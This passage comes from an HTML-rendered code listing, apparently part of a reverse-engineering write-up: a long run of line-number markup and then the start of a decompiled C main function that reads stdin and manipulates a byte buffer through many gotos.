class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br><span class="line">1338</span><br><span class="line">1339</span><br><span class="line">1340</span><br><span class="line">1341</span><br><span class="line">1342</span><br><span class="line">1343</span><br><span class="line">1344</span><br><span class="line">1345</span><br><span class="line">1346</span><br><span class="line">1347</span><br><span class="line">1348</span><br><span class="line">1349</span><br><span class="line">1350</span><br><span class="line">1351</span><br><span class="line">1352</span><br><span class="line">1353</span><br><span class="line">1354</span><br><span class="line">1355</span><br><span class="line">1356</span><br><span class="line">1357</span><br><span class="line">1358</span><br><span class="line">1359</span><br><span class="line">1360</span><br><span class="line">1361</span><br><span class="line">1362</span><br><span class="line">1363</span><br><span class="line">1364</span><br><span class="line">1365</span><br><span class="line">1366</span><br><span class="line">1367</span><br><span class="line">1368</span><br><span class="line">1369</span><br><span class="line">1370</span><br><span class="line">1371</span><br><span class="line">1372</span><br><span class="line">1373</span><br><span class="line">1374</span><br><span class="line">1375</span><br><span class="line">1376</span><br><span class="line">1377</span><br><span class="line">1378</span><br><span class="line">1379</span><br><span class="line">1380</span><br><span class="line">1381</span><br><span class="line">1382</span><br><span class="line">1383</span><br><span class="line">1384</span><br><span class="line">1385</span><br><span class="line">1386</span><br><span class="line">1387</span><br><span class="line">1388</span><br><span class="line">1389</span><br><span class="line">1390</span><br><span class="line">1391</span><br><span class="line">1392</span><br><span class="line">1393</span><br><span class="line">1394</span><br><span class="line">1395</span><br><span class="line">1396</span><br><span class="line">1397</span><br><span class="line">1398</span><br><span class="line">1399</span><br><span class="line">1400</span><br><span class="line">1401</span><br><span class="line">1402</span><br><span class="line">1403</span><br><span class="line">1404</span><br><span class="line">1405</span><br><span class="line">1406</span><br><span class="line">1407</span><br><span class="line">1408</span><br><span class="line">1409</span><br><span class="line">1410</span><br><span class="line">1411</span><br><span class="line">1412</span><br><span class="line">1413</span><br><span class="line">1414</span><br><span class="line">1415</span><br><span class="line">1416</span><br><span class="line">1417</span><br><span class="line">1418</span><br><span class="line">1419</span><br><span class="line">1420</span><br><span class="line">1421</span><br><span class="line">1422</span><br><span class="line">1423</span><br><span class="line">1424</span><br><span class="line">1425</span><br><span class="line">1426</span><br><span class="line">1427</span><br><span class="line">1428</span><br><span class="line">1429</span><br><span class="line">1430</span><br><span class="line">1431</span><br><span class="line">1432</span><br><span class="line">1433</span><br><span class="line">1434</span><br><span class="line">1435</span><br><span class="line">1436</span><br><span class="line">1437</span><br><span class="line">1438</span><br><span class="line">1439</span><br><span class="line">1440</span><br><span class="line">1441</span><br><span class="line">1442</span><br><span class="line">1443</span><br><span class="line">1444</span><br><span class="line">1445</span><br><span class="line">1446</span><br><span class="line">1447</span><br><span class="line">1448</span><br><span class="line">1449</span><br><span class="line">1450</span><br><span class="line">1451</span><br><span class="line">1452</span><br><span class="line">1453</span><br><span class="line">1454</span><br><span class="line">1455</span><br><span class="line">1456</span><br><span class="line">1457</span><br><span class="line">1458</span><br><span class="line">1459</span><br><span class="line">1460</span><br><span class="line">1461</span><br><span class="line">1462</span><br><span class="line">1463</span><br><span class="line">1464</span><br><span class="line">1465</span><br><span class="line">1466</span><br><span class="line">1467</span><br><span class="line">1468</span><br><span class="line">1469</span><br><span class="line">1470</span><br><span class="line">1471</span><br><span class="line">1472</span><br><span class="line">1473</span><br><span class="line">1474</span><br><span class="line">1475</span><br><span class="line">1476</span><br><span class="line">1477</span><br><span class="line">1478</span><br><span class="line">1479</span><br><span class="line">1480</span><br><span class="line">1481</span><br><span class="line">1482</span><br><span class="line">1483</span><br><span class="line">1484</span><br><span class="line">1485</span><br><span class="line">1486</span><br><span class="line">1487</span><br><span class="line">1488</span><br><span class="line">1489</span><br><span class="line">1490</span><br><span class="line">1491</span><br><span class="line">1492</span><br><span class="line">1493</span><br><span class="line">1494</span><br><span class="line">1495</span><br><span class="line">1496</span><br><span class="line">1497</span><br><span class="line">1498</span><br><span class="line">1499</span><br><span class="line">1500</span><br><span class="line">1501</span><br><span class="line">1502</span><br><span class="line">1503</span><br><span class="line">1504</span><br><span class="line">1505</span><br><span class="line">1506</span><br><span class="line">1507</span><br><span class="line">1508</span><br><span class="line">1509</span><br><span class="line">1510</span><br><span class="line">1511</span><br><span class="line">1512</span><br><span class="line">1513</span><br><span class="line">1514</span><br><span class="line">1515</span><br><span class="line">1516</span><br><span class="line">1517</span><br><span class="line">1518</span><br><span class="line">1519</span><br><span class="line">1520</span><br><span class="line">1521</span><br><span class="line">1522</span><br><span class="line">1523</span><br><span class="line">1524</span><br><span class="line">1525</span><br><span class="line">1526</span><br><span class="line">1527</span><br><span class="line">1528</span><br><span class="line">1529</span><br><span class="line">1530</span><br><span class="line">1531</span><br><span class="line">1532</span><br><span class="line">1533</span><br><span class="line">1534</span><br><span class="line">1535</span><br><span class="line">1536</span><br><span class="line">1537</span><br><span class="line">1538</span><br><span class="line">1539</span><br><span class="line">1540</span><br><span class="line">1541</span><br><span class="line">1542</span><br><span class="line">1543</span><br><span class="line">1544</span><br><span class="line">1545</span><br><span class="line">1546</span><br><span class="line">1547</span><br><span class="line">1548</span><br><span class="line">1549</span><br><span class="line">1550</span><br><span class="line">1551</span><br><span class="line">1552</span><br><span class="line">1553</span><br><span class="line">1554</span><br><span class="line">1555</span><br><span class="line">1556</span><br><span class="line">1557</span><br><span class="line">1558</span><br><span class="line">1559</span><br><span class="line">1560</span><br><span class="line">1561</span><br><span class="line">1562</span><br><span class="line">1563</span><br><span class="line">1564</span><br><span class="line">1565</span><br><span class="line">1566</span><br><span class="line">1567</span><br><span class="line">1568</span><br><span class="line">1569</span><br><span class="line">1570</span><br><span class="line">1571</span><br><span class="line">1572</span><br><span class="line">1573</span><br><span class="line">1574</span><br><span class="line">1575</span><br><span class="line">1576</span><br><span class="line">1577</span><br><span class="line">1578</span><br><span class="line">1579</span><br><span class="line">1580</span><br><span class="line">1581</span><br><span class="line">1582</span><br><span class="line">1583</span><br><span class="line">1584</span><br><span class="line">1585</span><br><span class="line">1586</span><br><span class="line">1587</span><br><span class="line">1588</span><br><span class="line">1589</span><br><span class="line">1590</span><br><span class="line">1591</span><br><span class="line">1592</span><br><span class="line">1593</span><br><span class="line">1594</span><br><span class="line">1595</span><br><span class="line">1596</span><br><span class="line">1597</span><br><span class="line">1598</span><br><span class="line">1599</span><br><span class="line">1600</span><br><span class="line">1601</span><br><span class="line">1602</span><br><span class="line">1603</span><br><span class="line">1604</span><br><span class="line">1605</span><br><span class="line">1606</span><br><span class="line">1607</span><br><span class="line">1608</span><br><span class="line">1609</span><br><span class="line">1610</span><br><span class="line">1611</span><br><span class="line">1612</span><br><span class="line">1613</span><br><span class="line">1614</span><br><span class="line">1615</span><br><span class="line">1616</span><br><span class="line">1617</span><br><span class="line">1618</span><br><span class="line">1619</span><br><span class="line">1620</span><br><span class="line">1621</span><br><span class="line">1622</span><br><span class="line">1623</span><br><span class="line">1624</span><br><span class="line">1625</span><br><span class="line">1626</span><br><span class="line">1627</span><br><span class="line">1628</span><br><span class="line">1629</span><br><span class="line">1630</span><br><span class="line">1631</span><br><span class="line">1632</span><br><span class="line">1633</span><br><span class="line">1634</span><br><span class="line">1635</span><br><span class="line">1636</span><br><span class="line">1637</span><br><span class="line">1638</span><br><span class="line">1639</span><br><span class="line">1640</span><br><span class="line">1641</span><br><span class="line">1642</span><br><span class="line">1643</span><br><span class="line">1644</span><br><span class="line">1645</span><br><span class="line">1646</span><br><span class="line">1647</span><br><span class="line">1648</span><br><span class="line">1649</span><br><span class="line">1650</span><br><span class="line">1651</span><br><span class="line">1652</span><br><span class="line">1653</span><br><span class="line">1654</span><br><span class="line">1655</span><br><span class="line">1656</span><br><span class="line">1657</span><br><span class="line">1658</span><br><span class="line">1659</span><br><span class="line">1660</span><br><span class="line">1661</span><br><span class="line">1662</span><br><span class="line">1663</span><br><span class="line">1664</span><br><span class="line">1665</span><br><span class="line">1666</span><br><span class="line">1667</span><br><span class="line">1668</span><br><span class="line">1669</span><br><span class="line">1670</span><br><span class="line">1671</span><br><span class="line">1672</span><br><span class="line">1673</span><br><span class="line">1674</span><br><span class="line">1675</span><br><span class="line">1676</span><br><span class="line">1677</span><br><span class="line">1678</span><br><span class="line">1679</span><br><span class="line">1680</span><br><span class="line">1681</span><br><span class="line">1682</span><br><span class="line">1683</span><br><span class="line">1684</span><br><span class="line">1685</span><br><span class="line">1686</span><br><span class="line">1687</span><br><span class="line">1688</span><br><span class="line">1689</span><br><span class="line">1690</span><br><span class="line">1691</span><br><span class="line">1692</span><br><span class="line">1693</span><br><span class="line">1694</span><br><span class="line">1695</span><br><span class="line">1696</span><br><span class="line">1697</span><br><span class="line">1698</span><br><span class="line">1699</span><br><span class="line">1700</span><br><span class="line">1701</span><br><span class="line">1702</span><br><span class="line">1703</span><br><span class="line">1704</span><br><span class="line">1705</span><br><span class="line">1706</span><br><span class="line">1707</span><br><span class="line">1708</span><br><span class="line">1709</span><br><span class="line">1710</span><br><span class="line">1711</span><br><span class="line">1712</span><br><span class="line">1713</span><br><span class="line">1714</span><br><span class="line">1715</span><br><span class="line">1716</span><br><span class="line">1717</span><br><span class="line">1718</span><br><span class="line">1719</span><br><span class="line">1720</span><br><span class="line">1721</span><br><span class="line">1722</span><br><span class="line">1723</span><br><span class="line">1724</span><br><span class="line">1725</span><br><span class="line">1726</span><br><span class="line">1727</span><br><span class="line">1728</span><br><span class="line">1729</span><br><span class="line">1730</span><br><span class="line">1731</span><br><span class="line">1732</span><br><span class="line">1733</span><br><span class="line">1734</span><br><span class="line">1735</span><br><span class="line">1736</span><br><span class="line">1737</span><br><span class="line">1738</span><br><span class="line">1739</span><br><span class="line">1740</span><br><span class="line">1741</span><br><span class="line">1742</span><br><span class="line">1743</span><br><span class="line">1744</span><br><span class="line">1745</span><br><span class="line">1746</span><br><span class="line">1747</span><br><span class="line">1748</span><br><span class="line">1749</span><br><span class="line">1750</span><br><span class="line">1751</span><br><span class="line">1752</span><br><span class="line">1753</span><br><span class="line">1754</span><br><span class="line">1755</span><br><span class="line">1756</span><br><span class="line">1757</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  ......</span><br><span class="line">  base = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3E8</span>uLL);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( base[<span class="hljs-number">1</span>] )</span><br><span class="line">    base[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  v4 = base[<span class="hljs-number">47</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">  base[<span class="hljs-number">41</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">  base[<span class="hljs-number">43</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">    base[<span class="hljs-number">47</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  base[<span class="hljs-number">46</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  *((_WORD *)base + <span class="hljs-number">22</span>) = <span class="hljs-number">1</span>;</span><br><span class="line">  v4 = base[<span class="hljs-number">45</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">  base[<span class="hljs-number">44</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">    base[<span class="hljs-number">45</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  v5 = base[<span class="hljs-number">41</span>];</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 )</span><br><span class="line">  {</span><br><span class="line">    base[<span class="hljs-number">44</span>] += v5;</span><br><span class="line">    base[<span class="hljs-number">45</span>] += v5;</span><br><span class="line">    base[<span class="hljs-number">41</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v6 = base[<span class="hljs-number">45</span>];</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v6 )</span><br><span class="line">  {</span><br><span class="line">    base[<span class="hljs-number">41</span>] += v6;</span><br><span class="line">    base[<span class="hljs-number">45</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( base[<span class="hljs-number">44</span>] )</span><br><span class="line">  {</span><br><span class="line">    ++base[<span class="hljs-number">43</span>];</span><br><span class="line">    base[<span class="hljs-number">44</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v7 = base + <span class="hljs-number">43</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !base[<span class="hljs-number">43</span>] )</span><br><span class="line">  {</span><br><span class="line">    v110 = base[<span class="hljs-number">47</span>];</span><br><span class="line">    v111 = base[<span class="hljs-number">46</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( base[<span class="hljs-number">44</span>] )</span><br><span class="line">      base[<span class="hljs-number">44</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v111 )</span><br><span class="line">      base[<span class="hljs-number">46</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v110 )</span><br><span class="line">      base[<span class="hljs-number">47</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_62;</span><br><span class="line">  }</span><br><span class="line">  v8 = base[<span class="hljs-number">47</span>];</span><br><span class="line">  v9 = base + <span class="hljs-number">44</span>;</span><br><span class="line">  v10 = base[<span class="hljs-number">46</span>];</span><br><span class="line">  <span class="hljs-keyword">if</span> ( base[<span class="hljs-number">44</span>] )</span><br><span class="line">    base[<span class="hljs-number">44</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v11 = <span class="hljs-built_in">getc</span>(stdin);</span><br><span class="line">    v7[<span class="hljs-number">1</span>] = v11;</span><br><span class="line">    *v7 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v11 )</span><br><span class="line">    {</span><br><span class="line">      v12 = v7 + <span class="hljs-number">2</span>;</span><br><span class="line">      v13 = <span class="hljs-number">0</span>;</span><br><span class="line">LABEL_18:</span><br><span class="line">      v14 = *(v7 - <span class="hljs-number">42</span>);</span><br><span class="line">      *(_WORD *)(v7 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v14 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_19;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_231;</span><br><span class="line">    }</span><br><span class="line">    *v7 = v11;</span><br><span class="line">    v12 = v7 + <span class="hljs-number">2</span>;</span><br><span class="line">    v7[<span class="hljs-number">2</span>] = v11;</span><br><span class="line">    v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v13 = v11;</span><br><span class="line">    v7[<span class="hljs-number">2</span>] = <span class="hljs-number">10</span> - v11;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v11 != <span class="hljs-number">10</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_18;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v10 )</span><br><span class="line">      v7[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v8 )</span><br><span class="line">      v7[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(v7 - <span class="hljs-number">2</span>) )</span><br><span class="line">      *(v7 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    v14 = *(v7 - <span class="hljs-number">42</span>);</span><br><span class="line">    v10 = v7[<span class="hljs-number">3</span>];</span><br><span class="line">    v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v8 = v7[<span class="hljs-number">4</span>];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v14 )</span><br><span class="line">    {</span><br><span class="line">LABEL_19:</span><br><span class="line">      v15 = v14 + <span class="hljs-number">1</span>;</span><br><span class="line">      *(v7 - <span class="hljs-number">42</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      v7[<span class="hljs-number">1</span>] = v14;</span><br><span class="line">      v7[<span class="hljs-number">2</span>] = v14 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v14 == <span class="hljs-number">-1</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_21;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_20;</span><br><span class="line">    }</span><br><span class="line">LABEL_231:</span><br><span class="line">    v15 = <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">    *(v7 - <span class="hljs-number">42</span>) = v15;</span><br><span class="line">    v7[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v10 )</span><br><span class="line">      v7[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v8 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v13 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_26;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_25;</span><br><span class="line">    }</span><br><span class="line">    v7[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v13 )</span><br><span class="line">    {</span><br><span class="line">LABEL_25:</span><br><span class="line">      v7[<span class="hljs-number">3</span>] = v13;</span><br><span class="line">      *v7 = v13;</span><br><span class="line">      v7[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">LABEL_26:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v14 )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v13 )</span><br><span class="line">        {</span><br><span class="line">          v9[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">          v9[<span class="hljs-number">3</span>] = v13;</span><br><span class="line">        }</span><br><span class="line">        v19 = v9[<span class="hljs-number">1</span>];</span><br><span class="line">        v14 = v19 + <span class="hljs-number">1</span>;</span><br><span class="line">        v9[<span class="hljs-number">1</span>] = v19 + <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v19 != <span class="hljs-number">-1</span> )</span><br><span class="line">        {</span><br><span class="line">          v9[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">          v9[<span class="hljs-number">2</span>] = v14;</span><br><span class="line">        }</span><br><span class="line">        v20 = *v9;</span><br><span class="line">        v21 = *v9 - <span class="hljs-number">1</span>;</span><br><span class="line">        *v9 = v21;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v20 == <span class="hljs-number">1</span> )</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        v16 = v21 - v20;</span><br><span class="line">        v17 = v20 - <span class="hljs-number">1</span>;</span><br><span class="line">        v18 = v9[<span class="hljs-number">4</span>];</span><br><span class="line">        v9[<span class="hljs-number">1</span>] = v17;</span><br><span class="line">        *v9 = v16 + <span class="hljs-number">1</span>;</span><br><span class="line">        v109 = v9 + <span class="hljs-number">2</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( !v17 )</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_38;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v18 )</span><br><span class="line">          v12[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">        v9 = v12;</span><br><span class="line">        v12 = v109;</span><br><span class="line">      }</span><br><span class="line">      v18 = v9[<span class="hljs-number">4</span>];</span><br><span class="line">      v109 = v9 + <span class="hljs-number">2</span>;</span><br><span class="line">LABEL_38:</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v18 )</span><br><span class="line">        v12[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v109 = v12;</span><br><span class="line">      v12 = v9;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(v12 - <span class="hljs-number">42</span>) )</span><br><span class="line">      *(v12 - <span class="hljs-number">42</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v13 )</span><br><span class="line">    {</span><br><span class="line">      *(v12 - <span class="hljs-number">42</span>) = v13;</span><br><span class="line">      *v12 = v13;</span><br><span class="line">      *((_WORD *)v12 + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v14 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_48;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v13 )</span><br><span class="line">    {</span><br><span class="line">      v22 = *v109;</span><br><span class="line">      v13 += *(v109 - <span class="hljs-number">2</span>);</span><br><span class="line">      *(v109 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v109 - <span class="hljs-number">2</span>) = v13;</span><br><span class="line">      v23 = v22 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v109 = v22 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v22 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_284;</span><br><span class="line">LABEL_47:</span><br><span class="line">      *--v109 = v22 - <span class="hljs-number">1</span>;</span><br><span class="line">      v109[<span class="hljs-number">1</span>] = v23 - v22 + <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    v22 = *v109;</span><br><span class="line">    v13 = *(v109 - <span class="hljs-number">2</span>);</span><br><span class="line">    v23 = *v109 - <span class="hljs-number">1</span>;</span><br><span class="line">    *v109 = v23;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v22 != <span class="hljs-number">1</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_47;</span><br><span class="line">LABEL_284:</span><br><span class="line">    --v109;</span><br><span class="line">LABEL_48:</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(v109 - <span class="hljs-number">2</span>) )</span><br><span class="line">      *(v109 - <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v13 )</span><br><span class="line">      *(v109 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    v24 = *(v109 - <span class="hljs-number">44</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v24 )</span><br><span class="line">      *(v109 - <span class="hljs-number">1</span>) = v24;</span><br><span class="line">    v4 = v109[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">    *(_WORD *)v109 = <span class="hljs-number">38</span>;</span><br><span 